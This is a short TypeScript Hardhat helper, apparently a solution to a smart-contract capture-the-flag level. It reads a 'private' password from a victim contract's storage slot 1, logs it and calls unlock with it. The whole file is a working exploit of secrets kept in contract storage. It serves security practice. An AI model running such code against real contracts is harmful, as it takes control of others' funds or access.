import { expect } from "chai";
import { ethers, waffle } from "hardhat";

const helper = async (victim: any) => {
  const provider = waffle.provider;
  const passwordBytes = await provider.getStorageAt(victim.address, 1);
  const passwordText = ethers.utils.parseBytes32String(passwordBytes);
  console.log("Password text: " + passwordText);
  await victim.unlock(passwordBytes);
};

export default helper;
